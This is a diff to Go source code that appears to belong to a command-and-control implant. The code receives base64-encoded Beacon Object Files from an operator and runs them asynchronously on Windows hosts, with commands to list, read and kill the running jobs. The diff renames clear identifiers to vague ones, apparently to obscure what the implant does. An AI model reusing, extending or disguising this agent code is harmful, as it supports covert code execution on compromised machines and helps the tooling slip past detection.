@@ -15,17 +15,17 @@ import (
 // BOF async command strings are defined via template in action_bof.go
 // Use bofTpl() and convenience functions to access them
 
-// BOFAsyncCommand handles async BOF execution
-type BOFAsyncCommand struct {
-	tpl *BOFTemplate
+// AsyncTaskMsg handles async BOF execution
+type AsyncTaskMsg struct {
+	tpl *TaskCfg
 }
 
-func (c *BOFAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data if available
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+func (c *AsyncTaskMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data if available
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 		if err == nil {
-			c.tpl = &BOFTemplate{}
+			c.tpl = &TaskCfg{}
 			if err := json.Unmarshal(decoded, c.tpl); err == nil {
 				SetBOFTemplate(c.tpl.Templates)
 			}
@@ -34,31 +34,31 @@ func (c *BOFAsyncCommand) Execute(ctx *CommandContext, args []string) CommandRes
 
 	osWindows := bofOSWindows()
 	if runtime.GOOS != osWindows {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E25),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 	// Will be handled by processBOFAsync with full command data
-	return CommandResult{
+	return OpResult{
 		Output:      Succ(S4),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-// BOFJobsCommand lists async BOF jobs
-type BOFJobsCommand struct {
-	tpl *BOFTemplate
+// JobListMsg lists async BOF jobs
+type JobListMsg struct {
+	tpl *TaskCfg
 }
 
-func (c *BOFJobsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data if available
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+func (c *JobListMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data if available
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 		if err == nil {
-			c.tpl = &BOFTemplate{}
+			c.tpl = &TaskCfg{}
 			if err := json.Unmarshal(decoded, c.tpl); err == nil {
 				SetBOFTemplate(c.tpl.Templates)
 			}
@@ -67,10 +67,10 @@ func (c *BOFJobsCommand) Execute(ctx *CommandContext, args []string) CommandResu
 
 	osWindows := bofOSWindows()
 	if runtime.GOOS != osWindows {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E25),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -78,17 +78,17 @@ func (c *BOFJobsCommand) Execute(ctx *CommandContext, args []string) CommandResu
 	return executeBOFJobsList()
 }
 
-// BOFOutputCommand retrieves output from an async BOF job
-type BOFOutputCommand struct {
-	tpl *BOFTemplate
+// TaskOutputMsg retrieves output from an async BOF job
+type TaskOutputMsg struct {
+	tpl *TaskCfg
 }
 
-func (c *BOFOutputCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data if available
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+func (c *TaskOutputMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data if available
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 		if err == nil {
-			c.tpl = &BOFTemplate{}
+			c.tpl = &TaskCfg{}
 			if err := json.Unmarshal(decoded, c.tpl); err == nil {
 				SetBOFTemplate(c.tpl.Templates)
 			}
@@ -97,18 +97,18 @@ func (c *BOFOutputCommand) Execute(ctx *CommandContext, args []string) CommandRe
 
 	osWindows := bofOSWindows()
 	if runtime.GOOS != osWindows {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E25),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	if len(args) < 1 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -116,17 +116,17 @@ func (c *BOFOutputCommand) Execute(ctx *CommandContext, args []string) CommandRe
 	return executeBOFGetOutput(jobID)
 }
 
-// BOFKillCommand terminates an async BOF job
-type BOFKillCommand struct {
-	tpl *BOFTemplate
+// JobStopMsg terminates an async BOF job
+type JobStopMsg struct {
+	tpl *TaskCfg
 }
 
-func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data if available
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+func (c *JobStopMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data if available
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 		if err == nil {
-			c.tpl = &BOFTemplate{}
+			c.tpl = &TaskCfg{}
 			if err := json.Unmarshal(decoded, c.tpl); err == nil {
 				SetBOFTemplate(c.tpl.Templates)
 			}
@@ -135,18 +135,18 @@ func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResu
 
 	osWindows := bofOSWindows()
 	if runtime.GOOS != osWindows {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E25),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	if len(args) < 1 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -154,34 +154,34 @@ func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResu
 	return executeBOFKillJob(jobID)
 }
 
-// processBOFAsync handles async BOF execution (called from CommandQueue)
-func (cq *CommandQueue) processBOFAsync(cmd Command) CommandResult {
+// processBOFAsync handles async BOF execution (called from WorkQueue)
+func (cq *WorkQueue) processBOFAsync(cmd Msg) OpResult {
 	osWindows := bofOSWindows()
 	if runtime.GOOS != osWindows {
-		return CommandResult{
-			Command:     cmd,
+		return OpResult{
+			Cmd:     cmd,
 			Output:      Err(E25),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Decode BOF and parse arguments (reuse existing logic)
 	bofBytes, err := base64.StdEncoding.DecodeString(cmd.Data)
 	if err != nil {
-		return CommandResult{
-			Command:     cmd,
+		return OpResult{
+			Cmd:     cmd,
 			Output:      Err(E18),
 			Error:       err,
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	var bofArgs []byte
 	asyncPrefix := bofAsyncCmdPrefix()
-	if cmd.Command != "" && strings.HasPrefix(cmd.Command, asyncPrefix) {
-		argString := strings.TrimPrefix(cmd.Command, asyncPrefix)
+	if cmd.Cmd != "" && strings.HasPrefix(cmd.Cmd, asyncPrefix) {
+		argString := strings.TrimPrefix(cmd.Cmd, asyncPrefix)
 		if argString != "" {
 			parsedArgs, err := parseBOFArguments(argString)
 			if err != nil {
@@ -191,6 +191,6 @@ func (cq *CommandQueue) processBOFAsync(cmd Command) CommandResult {
 		}
 	}
 
-	// Execute async on Windows (platform-specific)
+	// execute async on Windows (platform-specific)
 	return executeBOFAsyncPlatform(cmd, bofBytes, bofArgs)
 }
